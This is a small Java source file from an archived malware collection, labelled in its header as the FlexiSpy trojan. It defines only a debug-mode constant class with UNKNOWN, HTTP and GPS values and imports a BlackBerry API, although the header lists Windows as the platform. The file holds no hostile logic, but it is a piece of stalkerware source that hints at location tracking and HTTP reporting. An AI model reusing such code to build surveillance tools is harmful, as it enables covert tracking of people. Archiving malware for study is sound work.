/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.event.constant;

import net.rim.device.api.util.Persistable;

public final class FxDebugMode implements Persistable {
	
	public static final FxDebugMode UNKNOWN = new FxDebugMode(0);
	public static final FxDebugMode HTTP = new FxDebugMode(1);
	public static final FxDebugMode GPS = new FxDebugMode(2);
	private int id;
	
	private FxDebugMode(int id) {
		this.id = id;
	}

	public int getId() {
		return id;
	}
}
